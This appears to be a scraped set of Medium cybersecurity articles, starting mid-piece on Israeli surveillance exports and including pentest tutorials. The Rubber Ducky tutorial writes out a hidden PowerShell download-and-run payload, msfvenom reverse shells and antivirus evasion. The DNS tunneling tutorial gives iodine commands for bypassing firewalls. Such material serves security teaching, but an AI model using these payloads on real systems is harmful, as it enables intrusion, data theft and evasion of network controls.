But Israel’s cyber-espionage industry goes far beyond spyware. In October last year, an investigation by the Israeli newspaper Haaretz exposed several Israeli firms that had been selling offensive and defensive cybersecurity and surveillance software to countries across the globe, many with dubious human rights records.
For years there have been accounts of discreet Israeli business ties to the Emiratis and the Saudis, nations with which Israel has no formal diplomatic relationship, and which have long been outwardly inimical, if not hostile, to the Jewish state.
“What you see is that the relationships between these countries is being shaped through the buying and selling of surveillance and homeland security products.”
According to the website Intelligence Online, AGT International — a Switzerland-based company owned by Israeli businessman Mati Kochavi — signed a contract in 2008 with the UAE worth more than $800 million for a comprehensive surveillance and security system to protect the country’s oil and gas fields. More recently, the same company has been connected, via a Swiss intermediary, to a covert security partnership with the UAE on a civil surveillance network in Abu Dhabi known as “Falcon Eye.” One source told the online news outlet Middle East Eye that this system ensures “every person is monitored from the moment they leave their doorstep to the moment they return to it.”
Another Israeli firm, IntuView, created software for Saudi Arabia in 2015 to help track jihadists on social media, according to Bloomberg. This included a system to process 4 million Facebook and Twitter posts a day, and later a way to monitor public opinions about the royal family. According to Haaretz’s investigation, Verint Systems, an analytics company with around half of its employees based in Israel, sold a similar system to Bahrain.
Neve Gordon, a professor of international law at Queen Mary, University of London, believes these exports are having a significant effect on regional power dynamics. “Regimes like Saudi Arabia and other Gulf states are today much more cozy with Israel than they are with other Arab regimes in the area,” he tells me.
“This might not be on a political level, but it’s certainly on the military and private security industry level. What you see is that the relationships between these countries is being shaped through the buying and selling of surveillance and homeland security products. You can even say that part of the realignment of the Middle East is happening through this industry.”
Israel has long taken cybersecurity seriously. The country accounts for the second-largest number of cybersecurity deals globally after the U.S., according to a report from New York data firm CB Insights. In 2018, the total amount of funding for Israeli cybersecurity companies across all stages grew 22% year-over-year, to $1.03 billion, according to TechCrunch. Last year the Israeli government announced it would be investing 90 million shekels ($24 million) in the industry, shoring up the significant venture capital investment with a three-year program to fund pilot tests for companies working on “high-risk” research and development. When it comes to the meeting place of cybersecurity, surveillance, and homeland security, Israel is a powerhouse — and there are clear historical reasons for its success.
“From very early on, Israel realized cybersecurity was a medium where it would have to replicate its political struggles going on elsewhere,” says James Shires, a research fellow at the Belfer Center’s Cybersecurity Project. He mentions the Palestinian Intifada “moving online” with low-level website defacements, leaks, and hacks, but also the wider perception of threat from surrounding nations. “Israel operates on a high perception of threat generally. It’s very deeply embedded in the psyche, and there’s a very obvious threat from Iran.”
It’s this environment that led Israel to become the home to some of the earliest firewall software makers, such as the multinational IT security company Check Point. But it’s also this context that has pushed the country to develop its offensive cyber capabilities. In 2010, a powerful virus was uncovered and attributed to attacks on five industrial facilities in Iran over the course of 10 months. The apparent targets included a uranium enrichment facility in Natanz, Iran, according to analysis from experts on Iran and computer security specialists. Researchers believe that virus, called Stuxnet, was created in a joint effort by the U.S. and Israel.
Matters get more complex when you consider the relationship between Israel’s cybersecurity industry and its military. One thing many of the nation’s leading firms have in common, from Check Point to NSO Group, is a strong connection between its founders and the Israel Defense Forces (IDF). That is perhaps no surprise given Israel’s mandatory military service — which means that young people serving in IDF units are exposed to real-world cybersecurity threats, building experience and solutions that can be translated into private products and services after they leave.
“Our main economical, technological driver is the service of young Israelis in the IDF,” says Col. Gabi Siboni, director of the cybersecurity program at Israel’s Institute for National Security Studies (INSS). “They are targeted when they are in high school. Those that are capable are delivered to the technological unit. They get good training and then, because they’re not career officers, when they finish their service they go to market.”
One section of the IDF in particular has an association with Israel’s cybersecurity industry: Unit 8200, responsible for signals intelligence, and one that many founders of cybersecurity and surveillance startups have passed through. Gordon says that projects that start off within the military, which are then spun off or developed privately, are frequently offered back to the IDF. “When the military says ‘yes,’ it enters what I would call the laboratory,” he explains.
The security and surveillance testing ground is, according to Gordon, the battlefield in which Israeli forces are active, including the Occupied Palestinian Territories. It’s an argument that has been made before by other academics including Leila Stockmarr, whose 2016 essay argued that a key part of Israel’s cutting-edge military and policing capacities is how “new pieces of technology are developed and tested in a concrete situation of controlling a population, such as in the Gaza Strip.”
In this model, the surveillance and security sector is treated like an incubator for the military, and vice versa. The IDF can test these services for its own needs in areas such as the West Bank, Gaza Strip, and East Jerusalem. And through military contacts, firms developing cybersecurity or surveillance software can refine their product through experience in the field, before selling them on to other countries.
The IDF declined to comment on whether this was a common practice, and Israel’s Ministry of Defense did not respond to OneZero by the time of publication. When asked whether Israeli cybersecurity companies benefited from information collected on surveilled populations in the region, Siboni said, “Israel is a country of law. It’s a democratic country with its own checks and balances.”
In a recent piece for the Guardian, the longtime foreign correspondent Ian Black reinforces the idea that it is fear of Iran, above all, that has brought Israel and the Gulf states together in recent years. While sometimes publicly unfriendly, he writes, there has been a growing trend of secret diplomacy between Israel and other regional powers post-Arab Spring.
Yet while the influence of Iran is a mutual source of concern, and one that may overpower the traditional tensions between Israel and Gulf kingdoms over the Palestinian territories, this shifting balance in regional dynamics is closely tied to a shared perception of inward and outward threats. “You could say that political ties come from the shared threat of Iran, but it’s just as important that they see each other as useful partners for their domestic interests as well,” Shires tells me.
As Israel’s secret links with regional powers become not-so-secret, how the country goes forward with its burgeoning private-sector partnerships could help decide the future politics of the Middle East.
And that brings us back to NSO Group and Pegasus. Last year a Citizen Lab report found evidence of spyware infection in 45 countries, including the UAE, Saudi Arabia, Bahrain, Lebanon, and the Palestinian Territories. It followed up with another report alleging that Omar Abdulaziz, a Saudi activist and Canadian permanent resident, had been infected by Pegasus spyware.
Citizen Lab’s report was published one day before Jamal Khashoggi was murdered. Abdulaziz, his friend and collaborator, would go on to file a lawsuit claiming communications between him and Khashoggi were monitored by the Saudis using NSO software. The company subsequently denied any involvement, with co-founder Shalev Hulio telling the Israeli newspaper Yedioth Ahronoth that Khashoggi had not been targeted “with any product or technology of NSO.” All the same, the Washington Post, citing two former top U.S. security officials, reported that Saudi Arabia did indeed buy NSO software, via a Luxembourg-based affiliate called Q Cyber Technologies.
As cybersecurity continues to be major business, and as regional politics are reshaped by tensions with Iran, the new frontier of cyber-espionage has emerged as an important export for Israel. But building ties without enabling human right violations is proving to be a tricky balance to strike. As Israel’s secret links with regional powers become not-so-secret, how the country goes forward with its burgeoning private-sector partnerships could help decide the future politics of the Middle East.
Update: An earlier version of this story incorrectly stated the majority owners of NSO Group. The founders and management team of NSO Group acquired the firm from Francisco Partners in February 2019.
Written by
","['CONSUMER TECH', 'DIGITAL LIFE', 'INDUSTRY', 'SCIENCE & MEDICINE', 'ABOUT', 'Middle East', 'Israel', 'Cybersecurity', 'Cyber Espionage', 'Industry']"
It’s Impossible to Prove Your Laptop Hasn’t Been Hacked. I Spent Two Years Finding Out.,https://medium.com/theintercept/its-impossible-to-prove-your-laptop-hasn-t-been-hacked-i-spent-two-years-finding-out-652202b9d2a9?source=tag_archive---------5-----------------------,"By Micah Lee
Digital security specialists like me get some version of this question all the time: “I think my laptop may have been infected with malware. Can you check?”
We dread this sort of query because modern computer exploits are as complex, clever, and hard to reason about as modern…
Written by
","['Linux', 'Hacking', 'Nsa', 'Surveillance', 'Cybersecurity']"
Jihobbiests Jabber Gibberish - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/jiho-5ad4b0076b6f?source=tag_archive---------6-----------------------,"There have been some tweets suggesting that ISIS is directing their Belgian operatives to use “encryption” to protect against the impending crackdown. This is not true. Additionally, the advice is extremely low quality, not actionable, self contradictory and of dubious value at best.
The origin of the jihobbiest advice is an “ISIS tech support” Telegram channel.
These channels are for jihobbiest ISIS fanboys and are not used for operational control or guidance.
This advice is for an audience of ISIS supporters, not ISIS operatives.
The author tells their audience to avoid accessing the Internet unless they are using “encryption Software[sic] — (Tor — i2P — VPN).” These tools — Tor, I2P, VPNs — mask the user’s IP address. They do not provide end to end encryption. They are privacy and anonymity tools, not encryption tools.
These are not encryption tools. These are privacy tools. This fundamental error should raise a red flag for any reader, indicating that the is author ignorant of the subject matter.
The author tells his bros they must do something with their “jihadies[sic] files.” Either encrypt them (with what?) or delete them with an anti forensic file erasure tool. Destroying evidence before it is seized is generally good practice for criminals, but here the author can’t even decide on what course of action to take.
The “jihadies[sic] files” mentioned here are magazines, manuals, pamphlets, videos, audio files, and other jihadist literature. The aspirational jihadi lifestyle magazines that the jihobbiests habitually collect, along with other jihadi related propaganda.
The author tells the bros to lay low, keep their heads down and not attract attention. The author tells the bros to drastically alter their behavior and run. The author tells the bros to go silent. The author tells the bros to warn everyone. The author can’t make up their damn mind!
These suggested tactics are mutually exclusive, for the most part, and are either impractical or more likely to attract the attention of the security forces.
ISIS jihobbiests have a long track record of repurposing cyber security content from other online manuals. They blithely copy privacy manuals written by fantasists, and happily duplicate the procedures from dark net market buyer guides. They consistently fail to grasp the deeper fundamentals of operational security, instead they cargo cult the security procedures of others.
Unfortunately for them, not all threats are created equal. Not all security tools offer the same protection against different adversaries.
ISIS supporters do not face the same adversaries as college kids buying weed from dark net markets. The protections offered by Qubes and TAILS are similar, but not identical. They are not interchangeable except in certain circumstances. The author does not appear to understand this.
The author of this advice has created some confused and mangled security content. It is internally inconsistent, lacks clear directives, and demonstrates the author’s profound ignorance of security technologies. In fact, it demonstrates the author’s ignorance of operational terrorism in general and operational security in particular.
This is not operational guidance for ISIS terrorists. It does not recommend encryption to evade security forces. There is no practical advice here for real terrorists. It’s essentially just a statement of solidarity from the jihobbiests bros to ISIS supporters, ostensibly those in Belgium…who happen to be subscribed to an English language Telegram channel. It’s basically the jihadi equivalent of “sending thoughts and prayers.”
Update: counter terrorism experts agree, this “tutorial” is not an official ISIS statement.
Furthermore, as @rcallimachi points out, ISIS operatives receive direct hands on training. They are not left to fend for themselves using garbled juvenile tutorials disseminated via “ISIS affiliated” channels.
Written by
","['ISIS', 'Cybersecurity', 'Terrorism']"
"Journalists, please read this before reporting on passwords leaks",https://xato.net/journalists-please-read-this-before-reporting-on-passwords-leaks-9924230f7bdc?source=tag_archive---------4-----------------------,"Last week we had a bit of excitement in the security world — at least you’d think so by reading all the headlines. After all, most of us use Gmail, Hotmail, or Gmail and it’s unsettling knowing your account password might be compromised.
The problem here is that all too often the headlines are terribly misleading and too many people just see the headlines and never the article.
In this case, we find out that one guy made an unsubstantiated claim that he found someone selling compromised accounts on an underground forum. After reading more, we learn that these aren’t recently stolen accounts, but rather a collection of passwords from other hacks, possibly going back years. Chances are the large majority of these passwords are quite old, widely-traded, and mostly invalid.
Obviously these headlines are more sensational than actual news. Being a writer myself I know how it feels to submit a story and have some editor change the headline to something more exciting, although far from accurate. So I can’t just blame the journalists, although they all clearly ran with a poorly sourced and completely unconfirmed story. In fact, it seems that most of the stories are referring to the Reuters and other publications as their only source.
It turns out that even Hold Security, the company that discovered the passwords, claims that only 43.5 million of those 272 million accounts were unique credentials they hadn’t seen before. Furthermore, Dan Goodin of Ars Technica reported that 98 percent of the GMail accounts turned out to be invalid and 23 percent of the Mail.ru email addresses listed didn’t even exist.
It seems this password dump wasn’t that big of a deal after all.
Here are some real facts journalists should know before reporting on these types of stories:
What might also be helpful to journalists (and your editors) is to clarify some basic terminology:
Now knowing this, some of you journalists no doubt see how misleading and flat-our wrong your headlines were. A more accurate headline would have been Security firm claims to have obtained a password dump collected by some Russian over the years, but 98% of them aren’t even valid. But that doesn’t seem as exciting. You know why? Because it probably wasn’t news worth reporting in the first place.
The short URL for this article is https://xa.to/3v
Written by
","['Passwords', 'Cryptography', 'Application Security', 'Windows Security', 'Privacy', 'did this', 'This', 'Security', 'Cybersecurity', 'Passwords']"
Journey over unsecured IoT devices with Kamerka — RTSP and MQTT.,https://medium.com/@woj_ciech/journey-over-unsecured-iot-devices-with-kamerka-rtsp-and-mqtt-aba98839574?source=tag_archive---------8-----------------------,"In previous versions of Kamerka you could visualize cameras, social media photos, printers or Industrial Control Systems of any country. Now two more services have been added.
First of them is MQTT (Message Queue Telemetric Transport) which is widely used to manage IoT (Internet of Things) devices. You can spot it in different places: offices, universities or even power plants.
For example, it has been used in sensors communicating to a broker via satellite link, over occasional dial-up connections with healthcare providers, and in a range of home automation and small device scenarios
~ https://mqtt.org/
RTSP (Real-Time Streaming Protocol) as name explains, it gives real-time feed from IP camera, including sound. The main use case for RTSP is to be independent with possibility to implement it directly into your application. That means, if stream is not secured enough, someone can hijack it. Most of these devices are surveillance cameras and you can meet them near or inside buildings that require additional security.
Moreover, couple new features have been added. From now you can look each host up recursively and display theirs ports and hostnames directly on the map. More information about host can be gathered from newly added „Check ownership” link, which redirects to bgp.he.net and shows you details about owner of the netblock. This update also allows you to show only open assets and choose how many pages you want to retrieve.
MQTT is very known from it’s lack of security, article from 2016 confirms that even at that time it was a problem. It is based on M2M (Machine to Machine) protocol and operates on port 1883.
Worth to highlight is that security of MQTT should be followed together with hardening other services running on the machine. The biggest and most common mistake is to leave other services running on the same machine completely unsecured. Almost every MQTT server, serves additional dashboard on different ports, depending of product manufacturer. Dashboards can give visual insight about actual devices behind MQTT, it might be lights in office, temperature sensors or sprinklers.
In addition, some of the dashboards give you full access to every sensor, which means you can take control over whole building.
Nowadays, lot of MQTT run in the cloud and do not reveal their location so it’s hard to map it, however there are still some servers and infrastructure that might be visualized and potentially hijacked.
Without proper security in place, everyone can connect to device and subscribe to every topic, that’s how MQTT works. List of accessible topics is listed after clicking on one of the open devices.
There are lot of free tools to manage Message Queue Telemetry Transport devices, one of the most known is mqtt-spy, Mosquito MQTT or my favorite MQTT.fx. When attacker start subscribing to specific topic he gets data in return. The information depends of the usage, it might be air humidity, phone locations or power command in Area51.
Another service that can be abused for spying on people and buildings is RTSP. It usually operates on port 554 (sometimes 8554) and supports VHS like commands: PLAY, TEARDOWN, RECORD, SETUP or PAUSE. Together with Real-Time Transport Protocol (RTP) and Real-Time Control Protocol (RTCP) they create team for media delivery.
Attack vectors remain the same as for the rest of typical HTTP cameras, i.e. weak/default credentials or lack of authentication. To actually retrieve the stream, attacker needs to known or bruteforce path to the video, you can find full list here. There is already Nmap script for detection RTSP paths and more advanced tools like cameraradar. The simplest way to play the stream is with VLC player.
If you set up recursive mode, additional ports will be shown on the map. It’s really helpful to determine if there are more services running, most common it’s other IoT device with special dashboard. Quite often happens that MQTT and RTSP operate on this same host, which opens a lot of new possibility for spying.
There are a lot of results for any urbanized place in the world and it’s hard to keep the track of all type of exposed devices, their ports and potential vulnerabilities. Right now, ꓘamerka supports Elasticsearch output and with help of Kibana you can create awesome visualizations and dashboards. It includes ports, products, vulnerabilities, device types, ASN and much more. If you have to manage exposed devices on particular territory like cities or ICS devices in country, it’s perfect, elegant and the simplest way to do that.
I am aware that ꓘamerka can be abused by bad guys to find vulnerable device and extend their botnets or just by people violating others privacy. Keep in mind that it depends from you what you will do with the finding. During tests of new ꓘamerka features I came across something interesting which looked like power plant.
“Check ownership” link gave me information about owner of the subnet but unfortunately, data was outdated and there was no additional contact. It’s another proof that keeping whois information up to date is very helpful in case of fast reporting and mitigating any type of vulnerabilities.
Exposed topics indicate that it is actually power plant with various type of sensors publicly accessible. With no luck with whois information, I reported issue to the CERT-US and was very surprised with their fast reaction. After couple days, I’ve got information about my submission and that they will contact responsible company. Two days later access has been restricted.
If you want to help in some way, it is easy as that.
https://github.com/woj-ciech/kamerka
Usually, most of IoT devices weren’t made with security in mind. Almost everyday you can spot headlines about vulnerabilities in surveillance cameras, cardiac devices, baby heart monitors or other “smart” devices. However, described cases it’s not even fault of producer but the culprit is user that leaves his device open or with default/weak credentials. As you might see, this problem lasts from the beginning of Internet of Things era and it seems that it won’t stop soon.
Written by
","['IoT', 'Osint', 'Python', 'Cybersecurity', 'Security']"
Kali Linux and Rubber Ducky - sam iam - Medium,https://medium.com/@heavenraiza/kali-linux-and-rubber-ducky-93c5655e7a19?source=tag_archive---------4-----------------------,"In this edition of Pentest Magazine I decided to write my article on Kali, USB Rubber Ducky and the Simple Ducky Payload Generator. I will take it a step further by utilizing msfvenom to create a custom exe to spawn a reverse shell and use a custom ducky script to deliver the payload. Why write an article on this topic? A few weeks back I was surfing Pluralsight and I stumbled upon a video by Troy Hunt and USB Rubber Ducky. He was discussing possible payloads that can be delivered through the evil HID. As of late I have been pondering on ways to educate SMBs on different techniques a simple payload can be executed to infiltrate their business undetected.
This article assumes that you are familiar with Kali Linux and it’s awesomeness. Now USB Rubber Ducky, if you’re not familiar with it:
“The USB Rubber Ducky is a Human Interface Device programmable with a simple scripting language allowing penetration testers to quickly and easily craft and deploy security auditing payloads that mimic human keyboard input. The source is written in C and requires the AVR Studio 5 IDE from atmel.com/avrstudio. Hardware is commercially available at hakshop.com. Tools and payloads can be found at usbrubberducky.com. Quack!”
README.txt copied from https://github.com/hak5darren/USB-Rubber-Ducky
USB Rubber Ducky is a commercial product. It’s worth the cash and fun to play with!
We’ll continue on to the Simple Ducky Payload Generator created by skysploit.
The generator can be downloaded at https://code.google.com/archive/p/simple-ducky-payload-generator/downloads. The version as of this writing is installer_v1.1.1_debian.sh.
Once you download the file onto your Kali system, navigate to the Downloads folder to run the file. You’ll need to change the permissions of the file prior to executing, see below. Instructions also found on web page, including YouTube video.
Below is a series of screenshots similar to what you should see during the installation process.
Now simply type simple-ducky to run the payload generator
Now for this article I will stick to option #2 since typically our victims will be Windows users. For this demo I will use a Windows 7 “Persistence Reverse Shell” as the payload.
You need to specify if the machine has UAC enabled. In my case it does so I enter Y.
At the next screen there are more questions to answer: what would you like the username & password of the newly created admin to be, what IP address to connect the reverse shell to, is UAC enabled?, etc ..
The success screen is as follows:
At this point you’ll be asked if you want to set up the ncat listener & if you want to return to the main menu. I entered yes to both prompts. As you see below a window opens with the created files, including the listener on whatever port you specified.
Now the next task would be to copy the inject.bin file from /usr/share/simple-ducky to the microSD card, which will afterwards be inserted into the ducky. The ducky would be inserted into the victim machine.
What will this payload do exactly? It will create a persistent shell, create a local admin account, drop the firewall and enable Remote Desktop/Remote Desktop Assistance.
Now this payload generator is a nifty tool but what if you want to generate you own payloads for whatever reason? First you’ll need the Duck Encoder, which can be downloaded from Hak5 Darren’s Github page (URL near top of article).
So now I will generate my own payload using msfvenom and ducky script.
On my Kali machine I created a 32-bit binary to run on my Windows box using the following command:
Now to create the ducky payload, thanks to Mubix.
GUI R
DELAY 100
STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(‘http://www.yourwebsite.com/msfducky.old','%temp%\msfducky.exe'); Start-Process “%temp%\msfducky.exe”
ENTER
Save it as payload.txt. Next the inject.bin file needs to be created, which is saved to the root of the ducky, the evil HID.
Usage (within Duck Encoder directory): java -jar -i payload.txt -o /media/root/XXXX-XXXX/inject.bin
XXXX-XXXX = name Kali gives to your ducky.
With your ducky carrying the payload, all you need to do is insert it into the victim machine. Ducky will do the rest. :)
Now, see below, how can we take this a step further? On one of my machines running AVG, it picked up my malicious binaries but not my malicious DLLs.
So what next? Create a ducky script to execute the malicious DLLs. On a Windows box you’ll execute the following command to execute the DLL:
C:\Windows\System32 (or SysWOW64)\rundll32.exe %temp%\msfducky.dll,duck
(duck = non-existent function but needed to properly execute the rundll32 command. You can use anything here such as aaaa)
In order to create the DLL payload, instead of using “-f exe” within msfvenom, you’ll use “-f dll”.
You might be asking, where is the ducky script? I’ll leave that to you .. :^P
Written by
","['Kali Linux', 'Cybersecurity', 'Hacking']"
Kali Linux & Metasploit: Getting Started with Pen Testing,https://medium.com/cyberdefenders/kali-linux-metasploit-getting-started-with-pen-testing-89d28944097b?source=tag_archive---------5-----------------------,"Reminder: Attacking systems you do not have permission to attack is illegal. Only perform attacks on machines and networks you own or have permission for.
The field of cybersecurity has an abundance of tools for all sorts of tasks. One way to cut right to the most common tools is using Kali Linux. Kali Linux is a Linux based operating system with preinstalled security tools for penetration testing. Kali Linux is created an maintained by Offensive Security who focus on advancing security through tools and education. For our purposes we will use a virtual machine so that we can have multiple machines running at the same time.
The Metasploit Framework is an open source penetration testing and development platform that provides exploits for a variety of applications, operating systems and platforms. Metasploit is one of the most commonly used penetration testing tools and comes built-in to Kali Linux.
The main components of the Metasploit Framework are called modules. Modules are standalone pieces of code or software that provide functionality to Metasploit. There are six total modules: exploits, payloads, auxiliary, nops, posts, and encoders. We will just focus on exploits and payloads.
An exploit takes advantage of a system’s vulnerability and installs a payload.
The payload gives access to the system by a variety of methods (reverse shell, meterpreter etc.)
We will us both of these to gain access to the victim machine in the exercise detailed later.
Virtualbox is an operating system emulation software that gives us the ability to run additional systems from our local machine.
Kali Linux will be our local machine where we can run our attacks from. Since we will need both Kali and the Metasploitable vulnerable machine running we will use Virtualbox to emulate both environments. To login to Kali: username is root & password is toor.
Metasploitable 2 is designed to be vulnerable in order to work as a sandbox to learn security. This will provide us with a system to attack legally. Most of the vulnerabilities on Metasploitable are known so there are tons of resources available to help learn various attack types.
Metasploit is a framework within Kali to run attacks on other systems. Metasploitable is a vulnerable system that can be used as a target for attacks and security testing.
The pictures below show the settings to setup a new virtual machine for Metasploitable.
Metasploitable shouldn’t need more than 256MB of ram but you can add more if your system can handle it.
Instead of creating a new hard disk the Metasploitable machine we downloaded will act as our existing virtual hard disk.
We do not want the Metasploitable machine on our actual network, so configure the settings for that machine as below. Make sure the Kali machine is also on the Host-Only Adapter. (Settings or tabs not shown in the pictures below were left as default)
Make sure to change the network settings for Metasploitable to host-only adapter
Once we are done changing the settings we can start Metasploitable. The login and password are both: msfadmin. After logging in we can leave it running and start up Kali Linux. From there we can work with the Metasploit framework on Kali Linux.
Now that everything is setup we can focus on how we can break into the Metasploitable 2 machine from our Kali Linux VM.
With Metasploitable 2 most if not all the vulnerabilities are known. But that is not usually the case. For systems in the wild there is many more steps to get into a unknown system or network. To get comfortable with the Metasploit Framework we can look up vulnerabilities online to get comfortable with the workflow.
For this walk-through we will focus on VSFTPD v2.3.4. This vulnerability will provide root shell using Backdoor Command Execution. This means we will have full access to Metasploitable 2’s command line.
Step 1: Start the Metasploit Console
Now that the console has loaded up we can start prepping our exploit. VSFTPD (very secure ftp daemon) is a secure ftp server for unix based systems. The vulnerability we are exploiting was found in 2011 in version 2.3.4 of VSFTPD which allows for a user to connect to the server without authentication.
This is one example of how a system can be exploited using the Metasploit Framework. This attack can also be done manually without the tools provided by Metasploitable. There are more vulnerable systems that you can take a stab at with Metasploit. Vulnhub is one good resource for finding other vulnerable systems to test.
Find another way to exploit a vulnerability of the Metasploitable machine. There is a lot of information out there on what vulnerabilities are known on Metasploitable. You can use these to direct you on what sort of exploit that can be used to gain access to the victim machine.
Written by
","['About Us', 'The Lab', '2018 Team Projects', 'Industry Partners', 'Archive', '2018 Program', 'Kali Linux', 'Metasploit', 'Penetration Testing', 'Linux', 'Cybersecurity']"
KRACK: What to know and 8 ways to mitigate this new cyber attack,https://medium.com/pluralsight/krack-cyber-attack-e234be907b21?source=tag_archive---------3-----------------------,"As a Microsoft Certified Trainer, Pluralsight author and Certified Ethical Hacker, Dale Meredith knows a thing or two about security. So, when the recent cyber attack, KRACK, surfaced last week, Dale jumped on the opportunity to explain what you should know and how to reduce this new threat. Read on for Dale’s take on KRACK, and keep up with him on Twitter: @dalemeredith.
There’s nothing like waking up in the morning, only to discover a new cyber attack has surfaced — and on a technology we haven’t been concerned about previously.
Belgian researchers have found a vulnerability, which enables attackers to listen to wifi traffic as packets are traveling between devices and access points. This exploit is now known as KRACK (Key Reinstallation Attacks). KRACK hijacks data being sent over the network by disrupting the third step of the traditional WPA2 four-way “handshake.” The United States Computer Emergency Readiness Team contacted around 100 organizations ahead of the official announcement of the vulnerability on Monday Oct 16, 2017. (Kind of wish they would have announced it on Friday the 13th, huh?)
This wifi flaw was discovered in the security aspects of WPA2 by a security researcher named Mattie Van Hoff, a presenter at the BlackHat conference in Europe.
From the United States Computer Emergency Readiness Team:
“US-CERT has become aware of several key management vulnerabilities in the 4-way handshake of the wifi Protected Access II (WPA2) security protocol. The impact of exploiting these vulnerabilities includes decryption, packet replay, TCP connection hijacking, HTTP content injection and others. Note that as protocol-level issues, most or all correct implementations of the standard will be affected. The CERT/CC and the reporting researcher KU Leuven, will be publicly disclosing these vulnerabilities on 16 October 2017.”
Well, there’s some bad news. Basically, you can assume that you’re vulnerable to this attack if you have implemented WPA2 on your router, or any of your devices that you own (be it your tablet, smartphone, laptop, etc.). Or here’s the real kicker, your “Internet of Things” devices.
Yes, it affects Windows, Android, Apple Linux, or any system that is hooking into your wireless router. Let’s not forget all the networking devices; any and all wireless routers and/or range extenders. Oh wait, there’s more! Wireless printers, scanners, smartTVs — anything that uses wireless and WPA2. (Get my thoughts on the WPA2s and wild world of wireless here.)
Now to truly understand what’s happening, it’s time for a little history lesson. WPA2 is the de facto protocol for the wifi that we use for securing our home and business networks. How can you tell if you’re using WPA2? You can look at the details of your wifi connect and it should show you something like this:
When you log onto a WPA2 protected network, which requires your device to do a handshake with the router, (you can’t see this happen with your own eyes, but it’s something that happens in the world of digital 1s and 0s), both the router and your smartphone or laptop agree upon an encryption key that only works between those two devices. Sometimes the “wireless gremlins” step in and the handshake doesn’t complete, so the wireless router will restart the message that it sends to your device until it eventually connects.
If it has to restart the handshake for some reason, the same encryption key is used, and that’s where KRACK comes into play. The handshake is manipulated and replayed to the victim, which restarts the session between the two devices. The attacker reads the handshake, manipulates it, then sends it on its way. So now you can see why I said it’s an underlying problem with WPA protocols, not just any specific vendor.
Oh, and by the way, it affects all versions of WPA implementations in similar ways. This is very concerning because an attacker could decrypt packets via the TCP sequence part of a connection; and if the user is using TKIP or GCMP (which are both encryption protocols used in WPA), the attacker could decrypt and inject malicious packets. This means the attacker could force you to expose passwords to your online accounts, credit card information and any other information that you transmit via the wireless connection.
We now understand that the attacks work on both access points and clients, so please don’t think that simply updating the access point keeps you protected. This is a protocol issue. The easy fix would be for everyone to stop using wifi. Since we know THAT won’t happen, we have to be more realistic.
One last thing that comes to my mind when considering this type of attack: I foresee vendors taking advantage of this situation to drive sales of new and improved wireless devices. I predict an uptick in wireless router sales this year. Don’t believe me, keep an eye on the Black Friday Sales! Oh, snap — if this announcement had been released on Friday the 13th, we could have called it a real “Black Friday!”
On that note, see how your security skills stack up with this free assessment: Security for Hackers and Developers, and share your IQ on Twitter with #PluralsightIQ.
Written by
","['All stories', 'Security', 'Cybersecurity', 'Wifi', 'Cyberattack', 'Krack']"
Learn how easy is to bypass firewalls using DNS tunneling (and also how to block it),https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000?source=tag_archive---------5-----------------------,"See how I played red team/blue team on this simple network security experiment.
Many tutorials out there explain how to perform DNS tunneling but most of them feel like just a compilation of the commands needed to execute it, with almost no explanation on the networking background.
What’s even worse: No one seems to discuss how to prevent DNS tunneling from happening in your network.
DNS tunneling is a method used to send data over the DNS protocol, a protocol which has never been intended for data transfer. Because of that, people tend to overlook it and it has become a popular but effective tool in many attacks.
Most popular use case for DNS tunneling is obtaining free internet through bypassing captive portals at airports, hotels, or if you feel patient the not-so-cheap in flight Wi-Fi.
On those shared internet hotspots HTTP traffic is blocked until a username/password is provided, however DNS traffic is generally still allowed in the background: we can encode our HTTP traffic over DNS and voilà, we have internet access.
This sounds fun but reality is, browsing anything on DNS tunneling is slow. Like, back to 1998 slow.
Another more dangerous use of DNS tunneling would be bypassing network security devices (Firewalls, DLP appliances…) to set up a direct and unmonitored communications channel on an organisation’s network. Possibilities here are endless: Data exfiltration, setting up another penetration testing tool… you name it.
To make it even more worrying, there’s a large amount of easy to use DNS tunneling tools out there.
There’s even at least one VPN over DNS provider (warning: the design of the website is hideous, making me doubt on the legitimacy of it).
As a pentester all this is great, as a network admin not so much.
For those who know nothing about DNS but still made it here, I think you deserve a very brief explanation on what DNS does: DNS is like a phonebook for the internet, it translates URLs (human-friendly language, the person’s name), into an IP address (machine-friendly language, the phone number). That helps us remember many websites, same as we can remember many people’s names.
For those who know what DNS is I would suggest looking here for a quick refresh on DNS, but in short what you need to know is:
example.com → 12.34.52.67
example.com → server1.example.com, server2.example.com
Who is involved in DNS tunneling?
The 6 Steps in DNS tunneling (simplified):
As you can imagine with this setup the key to having a fast internet connection is low latency, and when most airlines provide internet connections with around 1 second of ping, you might spend the whole 17 hours 40 minutes between Auckland and Doha to load this article.
For this example we will use the famous tool iodine. From their website, the name came from this:
The name iodine was chosen since it starts with IOD (IP Over DNS) and since iodine has atomic number 53, which happens to be the DNS port number.
1. Checklist before you start — What you need:
2. Register a domain on GoDaddy and configure it like this:
A record called dnsa.exampledomain.xyz → your public IP address
NS record called t.exampledomain.xyz → dnsa.exampledomain.xyz
→ Protip: Having a short subdomain name like “t” will allow you to pack in more data in every single request.
You can do this with a dynamic IP but you will need to use Dynamid DNS provider and point the NS record to it.
3. Wait for it to propagate.
This could go from 1 to 24 hours.
4. Run iodine on your server:
$ sudo iodined -c -f 10.0.0.1 -P password t.exampledomain.xyz
…If you copy paste that password you deserve whatever happens due to it.
5. Verify that it works:
At this point you can verify your DNS setup on the following tool from the iodine team: https://code.kryo.se/iodine/check-it/
Iodine must be running on the server and be reachable from the internet!
It is also a good moment to check what is your client’s public IP address and note it down, that will help verify later that DNS tunneling works.
6. Run iodine on the client and establish the DNS tunnel:
On the client:
root@kali:~#iodine -I 50 -f -P password t.exampledomain.xyz.
A new network interface should appear in your client, and you should be able to ping the server’s tunnel IP address we configured before.
Now, at this point you could set up a route for your traffic to be sent to 10.0.0.1 and you’d be good to go. However DNS traffic is not encrypted so an extra step we can take is…
7. Establish an SSH tunnel over the DNS tunnel:
On the client establish an SSH tunnel against the server:
ssh -D 8080-N 10.0.0.1
-N makes it not execute a remote command, -D creates a socket to listen on this port and whenever a connection is done to it it forwards traffic over the SSH tunnel.
8. Change proxy settings accordingly on your browser:
9. Enjoy your slow, yet free, internet access.
Good way to test it is checking that your public IP address on the client is now the same as on the server… Congratulations!
Now this is the bit where I’ve struggled to find more information on.
There’s many approaches you can follow to block DNS tunneling, which one to choose will depend on your current deployment:
